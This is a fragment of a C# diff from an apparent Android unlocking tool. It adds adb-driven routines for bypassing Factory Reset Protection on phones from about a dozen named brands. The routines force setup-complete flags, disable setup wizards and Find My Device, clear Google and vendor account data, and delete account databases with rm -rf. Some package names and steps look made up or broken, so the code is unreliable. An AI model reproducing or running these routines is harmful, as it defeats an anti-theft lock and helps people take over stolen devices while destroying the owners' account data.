+                Log("[1/6] MTP + TalkBack Voice Command...", Colors.Orange);
+                Log("[2/6] Setting MTP mode...", Colors.Orange);
+                RunAdb("shell setprop sys.usb.config mtp,adb");
+                Log("[3/6] Enabling TalkBack...", Colors.Orange);
+                RunAdb(@"shell settings put secure enabled_accessibility_services com.google.android.marvin.talkback/com.google.android.marvin.talkback.TalkBackService");
+                RunAdb("shell settings put secure accessibility_enabled 1");
+                Log("[4/6] Opening Google assistant via voice...", Colors.Orange);
+                RunAdb("shell am start -n com.google.android.googlequicksearchbox/com.google.android.launcher.GEL");
+                Thread.Sleep(1000);
+                Log("[5/6] Simulating voice command...", Colors.Orange);
+                RunAdb("shell input keyevent 224");
+                Thread.Sleep(500);
+                RunAdb(@"shell am start -a android.intent.action.VIEW -d ""https://youtube.com""");
+                RunAdb(@"shell am start -a android.intent.action.VIEW -d ""https://myaccount.google.com""");
+                Log("[6/6] Opening settings...", Colors.Orange);
+                RunAdb("shell am start com.android.settings/com.android.settings.Settings");
+                Log("TalkBack voice command method complete.", Colors.Accent);
+            }, "MTP + TalkBack Voice Command");
+        }
+
+        private void MtpFullBypass()
+        {
+            if (!Confirm("Run FULL MTP FRP bypass (all methods combined)?")) return;
+            ExecuteWithWait(() =>
+            {
+                Log("[1/12] MTP + Full FRP Bypass starting...", Colors.Orange);
+                Log("[2/12] Setting MTP mode...", Colors.Orange);
+                RunAdb("shell setprop sys.usb.config mtp,adb");
+                RunAdb("shell setprop sys.usb.state mtp,adb");
+                Log("[3/12] FRP flags...", Colors.Orange);
+                RunAdb("shell settings put secure frp_mode_disabled 1");
+                RunAdb("shell settings put global device_provisioned 1");
+                RunAdb("shell settings put secure user_setup_complete 1");
+                RunAdb("shell content insert --uri content://settings/secure --bind name:s:frp_mode_disabled --bind value:s:1");
+                RunAdb("shell content insert --uri content://settings/global --bind name:s:device_provisioned --bind value:s:1");
+                RunAdb("shell content insert --uri content://settings/secure --bind name:s:user_setup_complete --bind value:s:1");
+                Log("[4/12] Disabling all wizards...", Colors.Orange);
+                string[] wiz = { "com.google.android.setupwizard", "com.sec.android.app.SecSetupWizard", "com.miui.miservice", "com.huawei.android.hwfrozen", "com.oppo.setupwizard", "com.heytap.setupwizard", "com.vivo.setupwizard", "com.zte.setupwizard", "com.motorola.setupwizard" };
+                foreach (var w in wiz) RunAdb("shell pm disable-user --user 0 " + w);
+                Log("[5/12] Clearing Google data...", Colors.Orange);
+                foreach (var c in new[] { "com.google.android.gsf.login", "com.google.android.gsf", "com.google.android.gms", "com.google.android.gms.auth", "com.google.android.gms.auth.authzen", "com.google.android.gms.auth.cryptauth", "com.google.android.gms.trust", "com.google.android.gms.fido" }) RunAdb("shell pm clear " + c);
+                Log("[6/12] Account databases...", Colors.Orange);
+                RunAdb(@"shell rm -rf /data/system/users/*/accounts.db");
+                RunAdb(@"shell rm -rf /data/system/users/*/accounts_de.db");
+                RunAdb(@"shell rm -rf /data/system/users/*/accounts_ce.db");
+                Log("[7/12] Clearing settings cache...", Colors.Orange);
+                RunAdb(@"shell rm -rf /data/system/users/*/settings_secure.xml");
+                Log("[8/12] Killing processes...", Colors.Orange);
+                RunAdb("shell am force-stop com.google.android.setupwizard");
+                RunAdb("shell am force-stop com.sec.android.app.SecSetupWizard");
+                Log("[9/12] Disabling FMD...", Colors.Orange);
+                RunAdb("shell pm disable-user --user 0 com.google.android.gms.trust");
+                Log("[10/12] Enabling developer options...", Colors.Orange);
+                for (int i = 0; i < 7; i++) RunAdb("shell settings put global development_settings_enabled 1");
+                RunAdb("shell settings put global adb_enabled 1");
+                Log("[11/12] Accessibility setup...", Colors.Orange);
+                RunAdb(@"shell settings put secure enabled_accessibility_services com.google.android.marvin.talkback/com.google.android.marvin.talkback.TalkBackService");
+                RunAdb("shell settings put secure accessibility_enabled 1");
+                Log("[12/12] Going home...", Colors.Orange);
+                RunAdb("shell am start -a android.intent.action.MAIN -c android.intent.category.HOME");
+                Log("FULL MTP FRP BYPASS COMPLETE! All 12 steps done.", Colors.Accent);
+            }, "Full MTP FRP Bypass");
+        }
+
+        private void MtpXiaomiBypass()
+        {
+            ExecuteWithWait(() =>
+            {
+                Log("[1/7] Xiaomi/Redmi MTP bypass...", Colors.Orange);
+                Log("[2/7] Setting MTP mode...", Colors.Orange);
+                RunAdb("shell setprop sys.usb.config mtp,adb");
+                Log("[3/7] Bypassing MIUI FRP...", Colors.Orange);
+                RunAdb("shell settings put global device_provisioned 1");
+                RunAdb("shell settings put secure user_setup_complete 1");
+                RunAdb("shell settings put secure frp_mode_disabled 1");
+                Log("[4/7] Disabling MIUI services...", Colors.Orange);
+                string[] miuiPkgs = { "com.miui.miservice", "com.miui.securitycenter", "com.miui.cleanmaster", "com.xiaomi.xmsf", "com.miui.daemon" };
+                foreach (var p in miuiPkgs) RunAdb("shell pm disable-user --user 0 " + p);
+                Log("[5/7] Clearing Xiaomi account...", Colors.Orange);
+                RunAdb("shell pm clear com.xiaomi.account");
+                RunAdb("shell pm clear com.xiaomi.xmsf");
+                Log("[6/7] Clearing MIUI setup...", Colors.Orange);
+                RunAdb("shell pm clear com.miui.miservice");
+                Log("[7/7] Going home...", Colors.Orange);
+                RunAdb("shell am start -a android.intent.action.MAIN -c android.intent.category.HOME");
+                Log("Xiaomi/Redmi MTP bypass complete.", Colors.Accent);
+            }, "Xiaomi/Redmi MTP Bypass");
+        }
+
+        private void MtpHuaweiBypass()
+        {
+            ExecuteWithWait(() =>
+            {
+                Log("[1/7] Huawei MTP bypass...", Colors.Orange);
+                Log("[2/7] Setting MTP mode...", Colors.Orange);
+                RunAdb("shell setprop sys.usb.config mtp,adb");
+                Log("[3/7] Bypassing Huawei FRP...", Colors.Orange);
+                RunAdb("shell settings put global device_provisioned 1");
+                RunAdb("shell settings put secure user_setup_complete 1");
+                RunAdb("shell settings put secure frp_mode_disabled 1");
+                Log("[4/7] Disabling Huawei services...", Colors.Orange);
+                string[] hwPkgs = { "com.huawei.android.hwfrozen", "com.huawei.systemmanager", "com.huawei.hianalytics", "com.huawei.ads", "com.huawei.hwid" };
+                foreach (var p in hwPkgs) RunAdb("shell pm disable-user --user 0 " + p);
+                Log("[5/7] Clearing Huawei account...", Colors.Orange);
+                RunAdb("shell pm clear com.huawei.hwid");
+                RunAdb("shell pm clear com.huawei.hianalytics");
+                Log("[6/7] Disabling Huawei setup...", Colors.Orange);
+                RunAdb("shell pm clear com.huawei.android.hwfrozen");
+                Log("[7/7] Going home...", Colors.Orange);
+                RunAdb("shell am start -a android.intent.action.MAIN -c android.intent.category.HOME");
+                Log("Huawei MTP bypass complete.", Colors.Accent);
+            }, "Huawei MTP Bypass");
+        }
+
+        private void MtpOppoBypass()
+        {
+            ExecuteWithWait(() =>
+            {
+                Log("[1/7] OPPO/Realme MTP bypass...", Colors.Orange);
+                Log("[2/7] Setting MTP mode...", Colors.Orange);
+                RunAdb("shell setprop sys.usb.config mtp,adb");
+                Log("[3/7] Bypassing ColorOS FRP...", Colors.Orange);
+                RunAdb("shell settings put global device_provisioned 1");
+                RunAdb("shell settings put secure user_setup_complete 1");
+                RunAdb("shell settings put secure frp_mode_disabled 1");
+                Log("[4/7] Disabling OPPO services...", Colors.Orange);
+                string[] oppoPkgs = { "com.oppo.setupwizard", "com.heytap.setupwizard", "com.heytap.market", "com.coloros.assistantscreen", "com.coloros.weather2" };
+                foreach (var p in oppoPkgs) RunAdb("shell pm disable-user --user 0 " + p);
+                Log("[5/7] Clearing OPPO account...", Colors.Orange);
+                RunAdb("shell pm clear com.heytap.cloud");
+                RunAdb("shell pm clear com.heytap.htms");
+                Log("[6/7] Clearing setup wizard...", Colors.Orange);
+                RunAdb("shell pm clear com.oppo.setupwizard");
+                Log("[7/7] Going home...", Colors.Orange);
+                RunAdb("shell am start -a android.intent.action.MAIN -c android.intent.category.HOME");
+                Log("OPPO/Realme MTP bypass complete.", Colors.Accent);
+            }, "OPPO/Realme MTP Bypass");
+        }
+
+        private void MtpVivoBypass()
+        {
+            ExecuteWithWait(() =>
+            {
+                Log("[1/7] Vivo MTP bypass...", Colors.Orange);
+                Log("[2/7] Setting MTP mode...", Colors.Orange);
+                RunAdb("shell setprop sys.usb.config mtp,adb");
+                Log("[3/7] Bypassing Vivo FRP...", Colors.Orange);
+                RunAdb("shell settings put global device_provisioned 1");
+                RunAdb("shell settings put secure user_setup_complete 1");
+                RunAdb("shell settings put secure frp_mode_disabled 1");
+                Log("[4/7] Disabling Vivo services...", Colors.Orange);
+                string[] vivoPkgs = { "com.vivo.setupwizard", "com.bbk.launcher2", "com.vivo.easyshare", "com.vivo.weather", "com.vivo.game" };
+                foreach (var p in vivoPkgs) RunAdb("shell pm disable-user --user 0 " + p);
+                Log("[5/7] Clearing Vivo account...", Colors.Orange);
+                RunAdb("shell pm clear com.bbk.cloud");
+                RunAdb("shell pm clear com.vivo.space");
+                Log("[6/7] Clearing setup wizard...", Colors.Orange);
+                RunAdb("shell pm clear com.vivo.setupwizard");
+                Log("[7/7] Going home...", Colors.Orange);
+                RunAdb("shell am start -a android.intent.action.MAIN -c android.intent.category.HOME");
+                Log("Vivo MTP bypass complete.", Colors.Accent);
+            }, "Vivo MTP Bypass");
+        }
+
+        private void MtpMotorolaBypass()
+        {
+            ExecuteWithWait(() =>
+            {
+                Log("[1/7] Motorola MTP bypass...", Colors.Orange);
+                Log("[2/7] Setting MTP mode...", Colors.Orange);
+                RunAdb("shell setprop sys.usb.config mtp,adb");
+                Log("[3/7] Bypassing Motorola FRP...", Colors.Orange);
+                RunAdb("shell settings put global device_provisioned 1");
+                RunAdb("shell settings put secure user_setup_complete 1");
+                RunAdb("shell settings put secure frp_mode_disabled 1");
+                Log("[4/7] Disabling Motorola services...", Colors.Orange);
+                string[] motoPkgs = { "com.motorola.setupwizard", "com.motorola.motocit", "com.motorola.attackservices", "com.motorola.launcher.config" };
+                foreach (var p in motoPkgs) RunAdb("shell pm disable-user --user 0 " + p);
+                Log("[5/7] Clearing Motorola account...", Colors.Orange);
+                RunAdb("shell pm clear com.motorola.motocit");
+                Log("[6/7] Clearing setup wizard...", Colors.Orange);
+                RunAdb("shell pm clear com.motorola.setupwizard");
+                Log("[7/7] Going home...", Colors.Orange);
+                RunAdb("shell am start -a android.intent.action.MAIN -c android.intent.category.HOME");
+                Log("Motorola MTP bypass complete.", Colors.Accent);
+            }, "Motorola MTP Bypass");
+        }
+
+        private void MtpLgBypass()
+        {
+            ExecuteWithWait(() =>
+            {
+                Log("[1/7] LG MTP bypass...", Colors.Orange);
+                Log("[2/7] Setting MTP mode...", Colors.Orange);
+                RunAdb("shell setprop sys.usb.config mtp,adb");
+                Log("[3/7] Bypassing LG FRP...", Colors.Orange);
+                RunAdb("shell settings put global device_provisioned 1");
+                RunAdb("shell settings put secure user_setup_complete 1");
+                RunAdb("shell settings put secure frp_mode_disabled 1");
+                Log("[4/7] Disabling LG services...", Colors.Orange);
+                string[] lgPkgs = { "com.lge.setupwizard", "com.lge.lgaccount", "com.lge.lgfashion", "com.lge.bnr", "com.lge.service.lgdm" };
+                foreach (var p in lgPkgs) RunAdb("shell pm disable-user --user 0 " + p);
+                Log("[5/7] Clearing LG account...", Colors.Orange);
+                RunAdb("shell pm clear com.lge.lgaccount");
+                Log("[6/7] Clearing setup wizard...", Colors.Orange);
+                RunAdb("shell pm clear com.lge.setupwizard");
+                Log("[7/7] Going home...", Colors.Orange);
+                RunAdb("shell am start -a android.intent.action.MAIN -c android.intent.category.HOME");
+                Log("LG MTP bypass complete.", Colors.Accent);
+            }, "LG MTP Bypass");
+        }
+
+        private void MtpNokiaBypass()
+        {
+            ExecuteWithWait(() =>
+            {
+                Log("[1/7] Nokia/HMD MTP bypass...", Colors.Orange);
+                Log("[2/7] Setting MTP mode...", Colors.Orange);
+                RunAdb("shell setprop sys.usb.config mtp,adb");
+                Log("[3/7] Bypassing Nokia FRP...", Colors.Orange);
+                RunAdb("shell settings put global device_provisioned 1");
+                RunAdb("shell settings put secure user_setup_complete 1");
+                RunAdb("shell settings put secure frp_mode_disabled 1");
+                Log("[4/7] Disabling Nokia services...", Colors.Orange);
+                string[] nokiaPkgs = { "com.nokia.mt", "com.hmd.global.appsupport", "com.nokia.camera" };
+                foreach (var p in nokiaPkgs) RunAdb("shell pm disable-user --user 0 " + p);
+                Log("[5/7] Clearing Nokia account...", Colors.Orange);
+                RunAdb("shell pm clear com.nokia.mt");
+                Log("[6/7] Clearing setup wizard...", Colors.Orange);
+                RunAdb("shell pm clear com.google.android.setupwizard");
+                Log("[7/7] Going home...", Colors.Orange);
+                RunAdb("shell am start -a android.intent.action.MAIN -c android.intent.category.HOME");
+                Log("Nokia/HMD MTP bypass complete.", Colors.Accent);
+            }, "Nokia/HMD MTP Bypass");
+        }
+
+        private void MtpSonyBypass()
+        {
+            ExecuteWithWait(() =>
+            {
+                Log("[1/7] Sony/Xperia MTP bypass...", Colors.Orange);
+                Log("[2/7] Setting MTP mode...", Colors.Orange);
+                RunAdb("shell setprop sys.usb.config mtp,adb");
+                Log("[3/7] Bypassing Sony FRP...", Colors.Orange);
+                RunAdb("shell settings put global device_provisioned 1");
+                RunAdb("shell settings put secure user_setup_complete 1");
+                RunAdb("shell settings put secure frp_mode_disabled 1");
+                Log("[4/7] Disabling Sony services...", Colors.Orange);
+                string[] sonyPkgs = { "com.sonymobile.setupwizard", "com.sonymobile.xperialab", "com.sonymobile.mt", "com.sonymobile.swiqareset", "com.sonymobile.entrance" };
+                foreach (var p in sonyPkgs) RunAdb("shell pm disable-user --user 0 " + p);
+                Log("[5/7] Clearing Sony account...", Colors.Orange);
+                RunAdb("shell pm clear com.sonymobile.mt");
+                Log("[6/7] Clearing setup wizard...", Colors.Orange);
+                RunAdb("shell pm clear com.sonymobile.setupwizard");
+                Log("[7/7] Going home...", Colors.Orange);
+                RunAdb("shell am start -a android.intent.action.MAIN -c android.intent.category.HOME");
+                Log("Sony/Xperia MTP bypass complete.", Colors.Accent);
+            }, "Sony/Xperia MTP Bypass");
+        }
+
+        private void MtpAsusBypass()
+        {
+            ExecuteWithWait(() =>
+            {
+                Log("[1/7] Asus MTP bypass...", Colors.Orange);
+                Log("[2/7] Setting MTP mode...", Colors.Orange);
+                RunAdb("shell setprop sys.usb.config mtp,adb");
+                Log("[3/7] Bypassing Asus FRP...", Colors.Orange);
+                RunAdb("shell settings put global device_provisioned 1");
+                RunAdb("shell settings put secure user_setup_complete 1");
+                RunAdb("shell settings put secure frp_mode_disabled 1");
+                Log("[4/7] Disabling Asus services...", Colors.Orange);
+                string[] asusPkgs = { "com.asus.setupwizard", "com.asus.asussupport", "com.asus.maxis", "com.asus.msa", "com.asus.gameassist" };
+                foreach (var p in asusPkgs) RunAdb("shell pm disable-user --user 0 " + p);
+                Log("[5/7] Clearing Asus account...", Colors.Orange);
+                RunAdb("shell pm clear com.asus.asussupport");
+                Log("[6/7] Clearing setup wizard...", Colors.Orange);
+                RunAdb("shell pm clear com.asus.setupwizard");
+                Log("[7/7] Going home...", Colors.Orange);
+                RunAdb("shell am start -a android.intent.action.MAIN -c android.intent.category.HOME");
+                Log("Asus MTP bypass complete.", Colors.Accent);
+            }, "Asus MTP Bypass");
         }
 
         private void ShowFastboot()
